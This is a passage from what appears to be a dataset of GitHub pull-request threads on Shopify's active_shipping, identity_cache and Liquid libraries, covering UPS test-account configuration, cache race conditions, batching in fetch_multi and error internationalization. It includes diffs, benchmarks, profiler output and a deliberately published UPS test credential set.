account is a separate type of account that UPS has. It can be shared and used by multiple ups.com accounts, which when given access, can bill that account for shipments that they create.\r\nIt is also sometimes referred to as the origin account, which is what those messages are talking about when they say ""must have a valid ups/origin_account"".\r\nYou can create one on ups.com. You just login, then click the shipping tab up top. Then click ""Open a Shipping Account"". Make sure to select that you don\'t want automatic pickup, because UPS charges a weekly fee for that.\r\nIf you create one they will give you a 6-digit account number that is your shipper account number.\r\nThen just add a line to credentials.yml so it looks like:\r\nups:\r\n  key: ""7CE85DED4C9D07AB""\r\n  login: ""shopifolk""\r\n  password: ""Shopify_rocks""\r\n  origin_account: Your Shipper Account Number\r\n\r\nThose 3 should pass if you do that.', 'Down to two errors.\r\n\r\n```\r\n  1) Error:\r\nRemoteUPSTest#test_obtain_shipping_label:\r\nRuntimeError: Could not obtain shipping label. Failure.\r\n    /home/vagrant/src/active_shipping/lib/active_shipping/carriers/ups.rb:162:in `rescue in create_shipment\'\r\n    /home/vagrant/src/active_shipping/lib/active_shipping/carriers/ups.rb:132:in `create_shipment\'\r\n    test/remote/ups_test.rb:223:in `test_obtain_shipping_label\'\r\n\r\n\r\n  2) Error:\r\nRemoteUPSTest#test_obtain_shipping_label_without_dimensions:\r\nRuntimeError: Could not obtain shipping label. Failure.\r\n    /home/vagrant/src/active_shipping/lib/active_shipping/carriers/ups.rb:162:in `rescue in create_shipment\'\r\n    /home/vagrant/src/active_shipping/lib/active_shipping/carriers/ups.rb:132:in `create_shipment\'\r\n    test/remote/ups_test.rb:243:in `test_obtain_shipping_label_without_dimensions\'\r\n\r\nups:\r\n  key: ""7CE85DED4C9D07AB""\r\n  login: ""shopifolk""\r\n  password: ""Shopify_rocks""\r\n  origin_account: ""X3V606""\r\n```', '@RichardBlair, any thoughts?', 'Awesome, we\'re getting there!\r\n\r\nSorry but I\'ve had another credential locally that is required which is \r\norigin_name: Shopify\r\n\r\nI think this ""origin_name"" was required for creating shipments prior to my PR but maybe not. Obviously it\'s not great that it\'s so difficult to figure out what options are required to actually get label creation to work. Part of that is the fault of response_message which sometimes (maybe always) fails to pull out the informative part of the error message, which in this case would be helpful in figuring out what\'s wrong.\r\nAny suggestions as to what to do about origin_name and origin_account not being obvious requirements? I could just throw a big fat error if they are not there when attempting to create labels.\r\n\r\nAfter adding this credential I found these tests were still failing. This was because negotiated rates indicator was automatically turned on if you passed in an origin_account. I did not account for the situation where someone has a shipper account but does not have negotiated rates with UPS. To remedy that I just pushed another commit that makes negotiated rates optional.\r\n\r\nIf you attempt the tests with the origin_name credential and my latest commit you should see both those tests pass. However now I\'m seeing ""test_just_country_given_with_origin_account_fails"" and ""test_ottawa_to_us_fails_with_only_zip_and_origin_account"" fail. I suppose some extra information about the shipper that is now being provided is causing those tests to successfully retrieve rates. \r\nI don\'t wanna be the guy who wants to remove tests rather than fix them, but I\'l just throw that out as an option. Because why is it important that active_shipping is unable to retrieve rates in those situations? As things are with my latest commit, we are passing that info to ups and they are returning rates. Seems like an OK situation to me. \r\nAny advice on how to move forward with those failing tests?\r\n\r\n', 'Agreed. It\'s not obvious why we were asserting that UPS shouldn\'t give rates. Instead of deleting the tests, we could assert that things pass:\r\n\r\n```\r\n07:40:13 {CasperSleep-international_ups_shipping} ~/src/active_shipping$ git diff\r\ndiff --git a/test/remote/ups_test.rb b/test/remote/ups_test.rb\r\nindex 8513ba8..88a5343 100644\r\n--- a/test/remote/ups_test.rb\r\n+++ b/test/remote/ups_test.rb\r\n@@ -63,15 +63,12 @@ class RemoteUPSTest < Minitest::Test\r\n     refute response.rates.empty?\r\n   end\r\n \r\n-  def test_just_country_given_with_origin_account_fails\r\n-    skip unless @options[:origin_account]\r\n-    assert_raises(ResponseError) do\r\n-      @carrier.find_rates(\r\n-        location_fixtures[:beverly_hills],\r\n-        Location.new(:country => \'CA\'),\r\n-        Package.new(100, [5, 10, 20])\r\n-      )\r\n-    end\r\n+  def test_just_country_given_passes\r\n+    @carrier.find_rates(\r\n+      location_fixtures[:beverly_hills],\r\n+      Location.new(:country => \'CA\'),\r\n+      Package.new(100, [5, 10, 20])\r\n+    )\r\n   end\r\n \r\n   def test_ottawa_to_beverly_hills\r\n@@ -109,17 +106,13 @@ class RemoteUPSTest < Minitest::Test\r\n     assert_nil package_rate[:rate]\r\n   end\r\n \r\n-  def test_ottawa_to_us_fails_with_only_zip_and_origin_account\r\n-    skip unless @options[:origin_account]\r\n-\r\n-    assert_raises ResponseError do\r\n-      @carrier.find_rates(\r\n-        location_fixtures[:ottawa],\r\n-        Location.new(:country => \'US\', :zip => 90210),\r\n-        package_fixtures.values_at(:book, :wii),\r\n-        :test => true\r\n-      )\r\n-    end\r\n+  def test_ottawa_to_us_passes_with_only_zip\r\n+    @carrier.find_rates(\r\n+      location_fixtures[:ottawa],\r\n+      Location.new(:country => \'US\', :zip => 90210),\r\n+      package_fixtures.values_at(:book, :wii),\r\n+      :test => true\r\n+    )\r\n   end\r\n```\r\n\r\nThis works with and without `origin_name: ""Shopify""` @RichardBlair?', '@robfoster re: those suggested changes to the tests. \r\nTake a look at ""test_ottawa_to_us_succeeds_with_only_zip"" and ""test_just_country_given"". \r\nThose ones already exist and are basically the same as what you\'ve modified the two failing tests to be. \r\nIt seems whoever wrote this, asserted that each of these things work without an origin account and fail with an origin account. I think what we\'ve discovered is that they work when you have no origin_account and also when you have both an origin account and a origin_name.\r\nI\'d say let\'s just remove the skip if @options[:origin_account] from the two tests I just mentioned, delete the two that are failing, and consider origin_account and origin_name a pair that must both be present or absent. And maybe document that somehow or raise an error if you try to specify only one of them?', 'Agreed: Delete the two tests that are failing because they\'re asserting failure that doesn\'t happen when we have the correct input. And document that for UPS tests we need five settings configured. The values below can be published (it\'s an account I just created for the purpose of getting these tests passing).\r\n```\r\nups:\r\n  key: ""7CE85DED4C9D07AB""\r\n  login: ""shopifolk""\r\n  password: ""Shopify_rocks""\r\n  origin_account: ""X3V606""\r\n  origin_name: ""Shopify""\r\n```\r\n\r\nAre we on the same page?', 'Yep!\r\nI just removed those tests and added origin_name and origin_account to credentials.yml to signal that those things need to be supplied for ups.\r\nIs there somewhere else I should document those options as required?\r\nAlso where were you thinking of publishing that account info? Is that supposed to be part of my PR? Or can you input that info into the travis CI environment?', ""I'll make sure it gets into Travis. @wvanbergen do you have creds for this?"", '@eboswort Thanks so much for working with us! ', 'Awesome! Thanks for your help getting it merged @robfoster @wvanbergen \r\n', ""I'll set up the credentials on Travis tomorrow.\n\nOn Friday, February 20, 2015, Eli Bosworth <notifications@github.com> wrote:\n\n> Awesome! Thanks for your help getting it merged @robfoster\n> <https://github.com/robfoster> @wvanbergen <https://github.com/wvanbergen>\n>\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub\n> <https://github.com/Shopify/active_shipping/pull/237#issuecomment-75330437>\n> .\n>\n"", 'See #244.\r\n\r\n@eboswort Thanks again for being patient with us here. It took a while before this got merged, but definitely the state of this project with regards to UPS is much better now. That should help getting your other PRs merged faster ;)']"
107,Shopify/active_shipping,236.0,"Pretty straightforward conversion.

@Shopify/shipping ",['Some small questions. Nothing stands out though. Thanks!']
108,Shopify/active_shipping,97.0,"The error messages from REXML leave a lot to be desired, especially since it says things failed at column x and row y, but doesn't give you the content.

This just improves the error message so we also have the response body from FedEx so that it's easier to debug.

Also wrapped `REXML::Document` creation in a function to keep things dry and such.

Please review @Soleone @jamesmacaulay /cc @jduff ","['minor comments :+1: ', ':+1: ']"
109,Shopify/identity_cache,135.0,"Assuming `ARecord.cache_has_many :b_records, :embed => true`
And `ARecord` has 2 `BRecord`
The nested cache invalidation mechanism work well when the modification is made through the relation
```
a = ARecord.first
a.fetch_b_records.count
  => 2 
a.fetch_b_records.destroy_all
a.fetch_b_records.count
  => 0
```

But if the record is deleted outside the relation of the original object there is currently no way to bust the cache
```
a = ARecord.first
a.fetch_b_records.count
  => 2 
ARecord.first.fetch_b_records.destroy_all
a.fetch_b_records.count
  => 2
a.reload
a.fetch_b_records.count
  => 2
```

This PR makes `reload` clear object instance internal cache. Object would have to retrieve a new copy of the cached object.","['cc: @byroot ', ""The implementation looks good to me. I'm more concern about how IDC will behave once the cache have been wiped out."", ""@dylanahsmith are you ok with that's happening here? You seems to have played with these meta variables in the past."", 'other than a couple of nitpicks :+1:', 'besides the .tap  comment. hulk squash and :sheep: ']"
110,Shopify/identity_cache,141.0,"**Problem:**

`SystemStackError: stack level too deep` is raised when attempting to fetch more records than the max stack size. This is caused by the use of splats:

```
2.1.0p0 :001 > def foo(*args); end 
2.1.0p0 :002 > foo(*(1..1_000_000).to_a)
SystemStackError: stack level too deep
```

**Solution:**

- Accept an array of ids in addition to a collection ids in `#fetch_multi`
- Stop using splats internally when calling `#fetch_multi`
- Call `ActiveSupport::Cache::Store#read_multi` in batches because it only accepts a collection (not array) of keys

I set the default batch size to 1,000, which might be a bit low.

@csaunders @camilo @pushrax","['Awesome!', 'Could you run the benchmark before and after this change and post the results?', ':+1: on a run of the bench suite ', 'Performance appears to be the same: https://gist.github.com/Thibaut/c51b83eb91802e9c52a0\r\n\r\nNote: I added a [commit](https://github.com/Thibaut/identity_cache/commit/bfc8e57aead29a267cfac9ed7396fe98651124ab) to remove a deprecation warning in `cache_runner.rb` that was flooding the console.', ""how hard would it be to have a test that repros the original failure ? besides that LGTM, wait for @dylanahsmith's blessing to ship tho.\r\n\r\nAlso please add this fix to the change log.\r\n\r\nand :star: "", ':+1:', ""The only thing I can think of is a kind of regression suite that runs it\nvia bash and picks up on the return code. It'll be slow, but it would let\nus catch regressions.\n\nI don't know if this is a good idea or not :(\n\n\nOn 3 April 2014 11:51, Camilo Lopez <notifications@github.com> wrote:\n\n> how hard would it be to have a test that repros the original failure ?\n> besides that LGTM, wait for @dylanahsmith<https://github.com/dylanahsmith>'s\n> blessing to ship tho.\n>\n> Also please add this fix to the change log.\n>\n> and [image: :star:]\n>\n> --\n> Reply to this email directly or view it on GitHub<https://github.com/Shopify/identity_cache/pull/141#issuecomment-39468221>\n> .\n>\n\n\n\n-- \nChris Saunders // Developer @ Shopify"", ""@csaunders wouldn't and array big enough cause the problem ?"", '@camilo This would catch the regression:\r\n\r\n```ruby\r\ndef test_fetch_stack_level\r\n  populate_only_fred\r\n  Item.fetch_multi([@fred.id] * 200_000)\r\nend\r\n```\r\n\r\nbut it takes 45sec to run on my machine.', ""And it's a stack exception which I don't think is recoverable in a test. If\nit is that would be aweeeeesome, otherwise... return code?\n\n\nOn 3 April 2014 12:00, Thibaut Courouble <notifications@github.com> wrote:\n\n> @camilo <https://github.com/camilo> This would catch the regression:\n>\n> def test_fetch_stack_level\n>   populate_only_fred\n>   Item.fetch_multi([@fred.id] * 200_000)end\n>\n> but it takes 45sec to run on my machine.\n>\n> --\n> Reply to this email directly or view it on GitHub<https://github.com/Shopify/identity_cache/pull/141#issuecomment-39469414>\n> .\n>\n\n\n\n-- \nChris Saunders // Developer @ Shopify"", '@csaunders Actually it is recoverable:\r\n\r\n```\r\n# Running tests:\r\n\r\n..........................................................................E................................................................................\r\n\r\nFinished tests in 15.454491s, 10.0294 tests/s, 23.0354 assertions/s.\r\n\r\n  1) Error:\r\nFetchMultiTest#test_fetch_stack_level:\r\nSystemStackError: stack level too deep\r\n    /Users/Thibaut/Shopify/identity_cache/lib/identity_cache.rb:145\r\n\r\n155 tests, 356 assertions, 0 failures, 1 errors, 0 skips\r\n```', '\\o/\n\n\nOn 3 April 2014 12:02, Thibaut Courouble <notifications@github.com> wrote:\n\n> @csaunders <https://github.com/csaunders> Actually it is recoverable:\n>\n> # Running tests:\n>\n> ..........................................................................E................................................................................\n>\n> Finished tests in 15.454491s, 10.0294 tests/s, 23.0354 assertions/s.\n>\n>   1) Error:\n> FetchMultiTest#test_fetch_stack_level:\n> SystemStackError: stack level too deep\n>     /Users/Thibaut/Shopify/identity_cache/lib/identity_cache.rb:145\n>\n> 155 tests, 356 assertions, 0 failures, 1 errors, 0 skips\n>\n> --\n> Reply to this email directly or view it on GitHub<https://github.com/Shopify/identity_cache/pull/141#issuecomment-39469732>\n> .\n>\n\n\n\n-- \nChris Saunders // Developer @ Shopify', ""hmrrr I'm of two minds here, the regression is good but +45 secs in the test suite is totally a bummer, I guess we can yolo the fix, or hide:\r\n```\r\ndef test_fetch_stack_level\r\n  populate_only_fred\r\n  # yes nothing raised come at me @csaunders\r\n  assert_nothing_raised{ Item.fetch_multi([@fred.id] * 200_000) }\r\nend\r\n```\r\n\r\nbehind an env var, but then it will most likely never run ....\r\n"", ':-1: to adding a regression test that takes that long.', ""@Thibaut as long as you could repro wihtout the pathc and it does not happen with the patch yeah let's leave the test out."", ""This test runs in ~4sec and catches the regression:\r\n\r\n```ruby\r\ndef test_fetch_stack_level\r\n  cache_response = { @fred_blob_key => cache_response_for(@fred) }\r\n  IdentityCache.cache.stubs(:read_multi).returns(cache_response)\r\n  Item.fetch_multi([@fred.id] * 200_000)\r\nend\r\n```\r\n\r\nthough it wouldn't fail on systems that allow a higher stack level than 200k."", 'Updated the doc and changelog: 65c51cf8923674d8afa474ea8ff92aeae501e318\r\nShould we increase the `BATCH_SIZE` to 10k?', '> Should we increase the BATCH_SIZE to 10k?\r\n\r\nhmm so the factors here are the number of iterations vs how memcached likes multi fetching  tens of thousands of elements (which TBH dunnolol). \r\n\r\nIMO keep it at 1k we can instrument on the app side and get some data on how often we are actually fetching more than 1k (my guess is not very often at all).\r\n\r\n', 'Thoughts on adding this test?\r\n\r\n```ruby\r\ndef test_fetch_stack_level\r\n  cache_response = { @fred_blob_key => cache_response_for(@fred) }\r\n  IdentityCache.cache.stubs(:read_multi).returns(cache_response)\r\n  assert_nothing_raised { Item.fetch_multi([@fred.id] * 200_000) }\r\nend\r\n```\r\n\r\n(takes ~4sec)\r\n\r\nI could leave it commented out or behind an env var.\r\n\r\n@dylanahsmith do you agree about keeping `BATCH_SIZE` at 1k?\r\n\r\nOk to merge?', ""4s is on the verge of too slow, but I think still acceptable, 1k is a good as 10k since we really have no data on the real usage pattern. I'd say :sheep: unless someone objects."", 'iamma merge  tomorrow unless someone objects.', 'oh @Thibaut :+1: from me on the test.', '@camilo Ok \xe2\x80\x94 adding it now.', '@camilo Done :)']"
111,Shopify/identity_cache,154.0,"# Problem
The IDC cache entry lifecycle looks like:

1. MC `get id` -> *miss*
1. AR find -> *record*
1. MC `set id, record`
1. *time passes*
1. update record (e.g. AR save or delete)
1. MC `delete id`

ActiveRecord updates therefore result in a memcache state for an entry that is indistinguishable from its initial state. As multiple application servers can share a memcache server, a race condition can occur where:

1. server *A* experiences an IDC miss and issues a SQL query for a record
1. server *B* queries and updates the same record, issuing a memcache `delete`
1. server *A* issues a memcache `set` with a now-stale record

# Solution
memcache provides a CAS (compare-and-swap) option to the `set` command. When this option is used, the cas value provided is compared against the cas value for the entry, and the `set` is only applied if the cas values match.

memcache also provides an `add` command, as an alternative to `set`, which will only write the entry if it does not already exist.

The IDC cache entry lifecycle is updated as follows:

1. MC `gets id` -> *miss*
1. AR find -> *record*
1. MC `add id, record`
1. *time passes*
1. update record (e.g. AR save or delete)
1. MC `set id, :idc_deleted`

This introduces a third state, *deleted*, to the two existing states, *present* and *absent* (*miss* above). If this state is seen by IDC, the lifecycle looks like:

1. MC `gets id` -> *deleted*, *cas-val*
1. AR find -> *record*
1. MC `set cas id, record, cas-val`
1. ...

Any update of the memcache entry between the `gets` and the `set cas ...`, e.g. a `set :idc_deleted` or another `set cas ...` for the same entry, will cause the `set cas ...` to fail (the entry will not be updated).

The sequence shown in the race condition above now looks like:

1. server *A* experiences an IDC miss and issues a SQL query for a record
1. server *B* queries and updates the same record, issuing a memcache `set :idc_deleted`
1. server *A* issues a memcache `add` with a now-stale record, and the `add` is rejected

Alternatively:

1. server *A* sees `:idc_deleted` and issues a SQL query for a record
1. server *B* queries and updates the same record, issuing a memcache `set :idc_deleted`
1. server *A* issues a memcache `set cas` with a now-stale record, and the `set` is rejected

# Tasks
- [x] Merge https://github.com/Shopify/memcached_store/pull/16
- [x] Publish a new memcached_store gem
- [x] Remove memcached_store from Gemfile
- [x] Document PR
- [x] Add tests for specific cases CAS is supposed to fix

@camilo @arthurnn for initial feedback","['Performance is 0-3% better on most operations, and around 2% worse on `FetchNormalizedMissRunner`:\r\n\r\n*With CAS:*\r\n```\r\nvagrant@vagrant:~/src/identity_cache$ bundle exec rake benchmark:cpu\r\n/usr/lib/shopify-ruby/2.1.1/bin/ruby ./performance/cpu.rb\r\nRehearsal: -------------------------------------------------------------\r\nFindRunner:                  0.440000   1.150000   1.590000 (  2.524452)\r\nFetchEmbedMissRunner:        0.770000   2.060000   2.830000 (  3.810681)\r\nFetchEmbedHitRunner:         0.070000   0.280000   0.350000 (  0.369662)\r\nFetchNormalizedMissRunner:   0.900000   3.980000   4.880000 (  6.571844)\r\nFetchNormalizedHitRunner:    0.030000   0.330000   0.360000 (  0.414600)\r\n------------------------------------------------------------------------\r\nFindRunner:                  0.360000   1.070000   1.430000 (  2.360597)\r\nFetchEmbedMissRunner:        0.730000   2.060000   2.790000 (  3.775003)\r\nFetchEmbedHitRunner:         0.080000   0.250000   0.330000 (  0.346722)\r\nFetchNormalizedMissRunner:   0.990000   3.850000   4.840000 (  6.484316)\r\nFetchNormalizedHitRunner:    0.040000   0.320000   0.360000 (  0.409110)\r\n```\r\n*The original version:*\r\n```\r\nvagrant@vagrant:~/src/perf/identity_cache$ bundle exec rake benchmark:cpu\r\n/usr/lib/shopify-ruby/2.1.1/bin/ruby ./performance/cpu.rb\r\nRehearsal: -------------------------------------------------------------\r\nFindRunner:                  0.350000   1.170000   1.520000 (  2.435468)\r\nFetchEmbedMissRunner:        0.780000   1.980000   2.760000 (  3.802566)\r\nFetchEmbedHitRunner:         0.050000   0.250000   0.300000 (  0.329725)\r\nFetchNormalizedMissRunner:   0.870000   3.810000   4.680000 (  6.305627)\r\nFetchNormalizedHitRunner:    0.040000   0.310000   0.350000 (  0.399753)\r\n------------------------------------------------------------------------\r\nFindRunner:                  0.320000   1.160000   1.480000 (  2.433534)\r\nFetchEmbedMissRunner:        0.870000   1.940000   2.810000 (  3.839997)\r\nFetchEmbedHitRunner:         0.070000   0.240000   0.310000 (  0.330881)\r\nFetchNormalizedMissRunner:   0.820000   3.870000   4.690000 (  6.357517)\r\nFetchNormalizedHitRunner:    0.050000   0.300000   0.350000 (  0.398206)\r\n```\r\n', 'cc @dylanahsmith @csfrancis ', ""Added benchmarks for the 2 conflict cases (where an entry doesn't exist & is deleted before the `add` is attempted, and where an entry has been deleted, and is deleted again before the `set cas` is attempted). Results are below (analysis TBD):\r\n\r\n```\r\nvagrant@vagrant:~/src/identity_cache$ bundle exec rake benchmark:cpu\r\n/usr/lib/shopify-ruby/2.1.1/bin/ruby ./performance/cpu.rb\r\nRehearsal: ------------------------------------------------------------------------\r\nFindRunner:                             0.700000   1.000000   1.700000 (  2.815822)\r\nFetchEmbedMissRunner:                   1.190000   1.720000   2.910000 (  4.004051)\r\nFetchEmbedHitRunner:                    0.020000   0.280000   0.300000 (  0.317486)\r\nFetchEmbedDeletedRunner:                1.060000   1.800000   2.860000 (  3.942712)\r\nFetchEmbedConflictRunner:               1.150000   1.950000   3.100000 (  4.347723)\r\nFetchEmbedDeletedConflictRunner:        1.060000   1.980000   3.040000 (  4.155652)\r\nFetchNormalizedMissRunner:              1.360000   3.320000   4.680000 (  6.348262)\r\nFetchNormalizedHitRunner:               0.150000   0.170000   0.320000 (  0.369872)\r\nFetchNormalizedDeletedRunner:           0.740000   1.420000   2.160000 (  3.249827)\r\nFetchNormalizedConflictRunner:          1.090000   1.850000   2.940000 (  4.026554)\r\nFetchNormalizedDeletedConflictRunner:   1.190000   1.890000   3.080000 (  4.165055)\r\n-----------------------------------------------------------------------------------\r\nFindRunner:                             0.400000   1.040000   1.440000 (  2.392250)\r\nFetchEmbedMissRunner:                   1.070000   1.720000   2.790000 (  3.818995)\r\nFetchEmbedHitRunner:                    0.150000   0.260000   0.410000 (  0.440866)\r\nFetchEmbedDeletedRunner:                1.090000   1.860000   2.950000 (  4.062142)\r\nFetchEmbedConflictRunner:               1.050000   2.000000   3.050000 (  4.145118)\r\nFetchEmbedDeletedConflictRunner:        1.080000   1.990000   3.070000 (  4.113635)\r\nFetchNormalizedMissRunner:              1.550000   3.410000   4.960000 (  6.791460)\r\nFetchNormalizedHitRunner:               0.130000   0.200000   0.330000 (  0.370962)\r\nFetchNormalizedDeletedRunner:           0.670000   1.520000   2.190000 (  3.175876)\r\nFetchNormalizedConflictRunner:          1.070000   2.010000   3.080000 (  4.262752)\r\nFetchNormalizedDeletedConflictRunner:   1.110000   1.970000   3.080000 (  4.166626)\r\n```"", 'In the previous comment, the *Deleted*, *Conflict* and *DeletedConflict* results should be compared against the corresponding *Miss* results, since they all result in reloads from the DB.\r\n\r\n* The *Miss* cases have `nil` entries for all records (triggers `add` commands)\r\n* The *Deleted* cases have `:idc_deleted` entries for all records (triggers `set cas` commands)\r\n* The *Conflict* cases start with `nil` entries for all records, and change each record to `:idc_deleted` between the `get` and `add` commands\r\n* The *DeletedConflict* cases start with `:idc_deleted` entries for all records, and update each record with `set :idc_deleted` between the `get` and `set cas` commands', '/cc @Shopify/webscale ', 'Awesome pull request description!  Looks like this has been thought out well.', 'Ping @Shopify/webscale ', 'Can someone review this?', 'On it..', '@arthurnn can you help me with this too? My IDC context is not that great..', 'also @airhorns might have good ideas here', 'back to the biergarten ... :runner: ', 'I think this may be missing a test for fetch_multi after expiring a record (i.e. `:idc_cached_deleted` is cached).  The code looks correct for this case, but it looks like it would be easy to break by accidentally doing an `add` instead of an `cas` for these cached `:idc_cached_deleted` values.', 'Overall looks great!', ':clap: :clap: :eyeglasses: @dylanahsmith :beers: ', "":bow: @dylanahsmith \r\n\r\nI'm bookmarking this as an example of how to do a code review. Seriously, you should teach a class."", ':+1: for @dylanahsmith code review class', ""Awesome review, thanks @dylanahsmith! I've addressed the review feedback. I also bumped the `VERSION` and `CACHE_VERSION`. Older clients won't deal with `:idc_cached_deleted` properly, which would break things during deploy."", ':+1:', 'See https://circleci.com/gh/Shopify/shopify/78189 for failures in Shopify with this PR. I think the problem is interactions between MemcachedSnappyStore & Memcached.cas, with both layers doing serialization.']"
112,Shopify/identity_cache,178.0,"`should_cache?` disables both using and updating the cache when `IdentityCache.readonly` is `true` or we're inside a transaction. This doesn't allow using IDC in a readonly fashion (e.g. from a diagnostic tool or maintenance task).

This PR splits `should_cache?` into `should_use_cache?` and `should_update_cache?`, and allows reading from IDC only when `should_use_cache?` is true, and allows writing to IDC only when `should_update_cache?` is true. `should_use_cache?` implies we're outside a transaction, `should_update_cache?` implies `should_use_cache?` and `!readonly`.

@camilo, @Shopify/webscale for review.
","['cc @arthurnn @dylanahsmith if you guys have a second to spare', 'LGTM', 'LGTM']"
113,Shopify/identity_cache,12.0,"@camilo @hornairs Please review

bug in fetch_multi allowed records to be cached to the wrong key.","['ping, updated', ':sheep: :ship: :muscle: ', ':+1: :grey_exclamation: ']"
114,Shopify/identity_cache,199.0,"@BlakeMesdag & @tjoyal for review

## Problem

We noticed redundant memcache delete requests after pull #184 was introduced.  It looks like this happens when a record embeds a cache blob more than once.

## Solution

When a child expires its parent caches, it first builds up a complete set of all the records that need their cache invalidated, then expires the cache on those records.  A hash is used to implement this set, and the primary cache key is used as a key, so it will avoid adding multiple records to the set for the same database row, even if there are multiple record instances for that row in memory.","[""2 tiny comments. I think everything is good, but I'll have to admin these inner working of AR aren't my strong element. It's a :+1: for me but __if__ any of you have an uneasy feeling, I suggest asking for a 3th reviewer."", '@arthurnn want to review this as well?', 'LGTM! :shipit: ']"
115,Shopify/liquid,241.0,"Simple possible implementation of I18n support for Liquid errors, as requested in #18.

@fw42 please take a look.","['Hm, haven\'t taken a very close look, but considering we only have like 5 error messages at most, this seems very overkill. Also, I don\'t want to call it ""I18n"", that\'s a bit confusing.', '@phoet, thoughts?', ""Hm, ok, on second thought, maybe it's not overkill. Seems nice actually. @arthurnn, @dylanahsmith, any comments so far?"", ""Since I18n is self-referential, it can stack overflow if the error message doesn't exist in the database. There are three solutions:\r\n\r\n1. We don't care to translate errors in I18n.\r\n2. Add some logic that handles this case and presents a better error than a stack overflow.\r\n3. We don't really care about this case as people should generally be able to copy the english locale and go from there and never have to worry about this."", '@fw42 What should be done? Thoughts on whether the logic in Template#initialize should be moved?', 'Wait for one of the three people I asked for comments to actually say something :P', 'Guys, can one of you please take a look? @arthurnn, @dylanahsmith, @phoet, @trishume', ""I'm still not sure about calling this I18n. It's confusing."", ""Looks pretty good. I agree about not naming it *I18n* though, maybe 'Internationalization'?"", 'I like the `I18n` name , as long as we always use it under the `Liquid::` namespace .', ""What's do you guys not like about `I18n` @trishume @fw42 as long as it is namespaced properly everywhere? The reason why people call things `I18n` and not `Internationalization` is because that word is so absurdly long. "", 'I was under the impression that most people associate the term ""I18n"" with one specific implementation of Internationalization (the one that comes with Rails). I didn\'t know it\'s just a shorter synonym. Feel free to use it then.', 'It is indeed just a short term, on my old times of java development, we used to use I18n for classes and all that.  http://struts.apache.org/release/1.3.x/apidocs/org/apache/struts/tiles/xmlDefinition/I18nFactorySet.html', '@fw42 sorry, i am quite bussy right now and on vacation from thursday on. will have no time to review!', '@arthurnn @trishume @fw42 I removed the option passing to parse and changed the interpolation syntax.', 'Really like the lib/liquid/template.rb now.. :green_heart: :heart: :pineapple: :heart: :green_heart: .\r\n\r\nProbably before merge we would want to squash those back and forth in one commit, but besides that I like it.\r\n:+1: on my side.', ""Also need to actually add the translations. :-) Still don't know whether every exception should be translated, or just syntax errors. See thread above."", ""This looks great, I like the interpolation syntax. In terms of translations I think it should be every error that can be produced by problems with a template, which means any error that a user rather than a developer will see.\r\n\r\nThat means syntax errors as well as some other errors like 'missing filter'."", ""I'll wait with this until the new parser is merged in."", '@Sirupsen, @trishume, lets try to get both this and the new parser shipped by tomorrow.', '@fw42 Agreed! Now that this PR encompasses both the new parser and fancy errors we can just merge this one and close the other.', 'I would rather have two separate merges (first the parser branch, then this one). :boat: :dash: ', ""@fw42 agreed, that's cleaner"", 'Couple of small comments, other than that, :+1: ']"
116,Shopify/liquid,383.0,"Taking a second crack at #382. In the comments for that PR, @dylanahsmith mentioned that the variable lookup could be extracted during the parse phase and reused during the render phase. He explained it here: https://github.com/Shopify/liquid/pull/382#issuecomment-49326355.

I took a couple tries at separating parsing of variables and lookup/resolution. I kept getting tripped up by corner cases as well as my general lack of experience with the liquid codebase. I'm sure it's possible to achieve -- I just kept hitting cases which forced me to write some ugly looking constructs to get around.

So, in the interests of not letting perfect be the enemy of good, I went back to the original solution. I realized that the markup cache did not need to be a class based LRU but could just be a member of the Context class. That way, the variable would be parsed only the first time it was encountered. It must be resolved on each instance as it may be different for every execution (such as in loops).

Here's the current benchmark on my box for master (best of 3 runs):

```
                   user     system      total        real
parse:         2.040000   0.000000   2.040000 (  2.034119)
parse & run:   4.410000   0.000000   4.410000 (  4.421325)
```

And the object allocation profile:

```
==================================
  Mode: object(1)
  Samples: 8805500 (0.00% miss rate)
  GC: 0 (0.00%)
==================================
     TOTAL    (pct)     SAMPLES    (pct)     FRAME
   1947200  (22.1%)     1462300  (16.6%)     Liquid::Context#variable
   2185900  (24.8%)     1433400  (16.3%)     Liquid::Variable#lax_parse
  10194700 (115.8%)      806100   (9.2%)     Liquid::Block#parse
    752500   (8.5%)      752500   (8.5%)     block in Liquid::Variable#lax_parse
   2944500  (33.4%)      521600   (5.9%)     Liquid::Block#create_variable
    438600   (5.0%)      438600   (5.0%)     Liquid::Template#tokenize
    480300   (5.5%)      433300   (4.9%)     Liquid::Context#find_variable
   2368300  (26.9%)      421100   (4.8%)     Liquid::Context#resolve
   3075100  (34.9%)      300600   (3.4%)     Liquid::Variable#render
   1075400  (12.2%)      295500   (3.4%)     block in Liquid::Variable#render
    289100   (3.3%)      289100   (3.3%)     Liquid::If#lax_parse
   2422900  (27.5%)      238800   (2.7%)     block in Liquid::Block#create_variable
    204800   (2.3%)      204800   (2.3%)     Liquid::StandardFilters#truncatewords
    146100   (1.7%)      143500   (1.6%)     Liquid::For#lax_parse
   9043900 (102.7%)      108700   (1.2%)     Liquid::Block#render_all
    600600   (6.8%)       98500   (1.1%)     Liquid::Context#invoke
     70700   (0.8%)       70700   (0.8%)     Liquid::Block#block_delimiter
     48300   (0.5%)       48000   (0.5%)     Liquid::Context#initialize
  10764400 (122.2%)       47600   (0.5%)     Liquid::Tag.parse
     47000   (0.5%)       47000   (0.5%)     block in Liquid::Context#find_variable
```

Now, here's the benchmark with the code in this PR applied (best of 3 runs):

```
                   user     system      total        real
parse:         2.040000   0.000000   2.040000 (  2.041081)
parse & run:   4.260000   0.000000   4.260000 (  4.269505)
```

And the object allocation profile:

```
==================================
  Mode: object(1)
  Samples: 8213900 (0.00% miss rate)
  GC: 0 (0.00%)
==================================
     TOTAL    (pct)     SAMPLES    (pct)     FRAME
   2185900  (26.6%)     1433400  (17.5%)     Liquid::Variable#lax_parse
   1349600  (16.4%)      864700  (10.5%)     Liquid::Context#variable
  10194700 (124.1%)      806100   (9.8%)     Liquid::Block#parse
    752500   (9.2%)      752500   (9.2%)     block in Liquid::Variable#lax_parse
   2944500  (35.8%)      521600   (6.4%)     Liquid::Block#create_variable
    438600   (5.3%)      438600   (5.3%)     Liquid::Template#tokenize
    480300   (5.8%)      433300   (5.3%)     Liquid::Context#find_variable
   1770700  (21.6%)      421100   (5.1%)     Liquid::Context#resolve
   2570800  (31.3%)      300600   (3.7%)     Liquid::Variable#render
   1056600  (12.9%)      295500   (3.6%)     block in Liquid::Variable#render
    289100   (3.5%)      289100   (3.5%)     Liquid::If#lax_parse
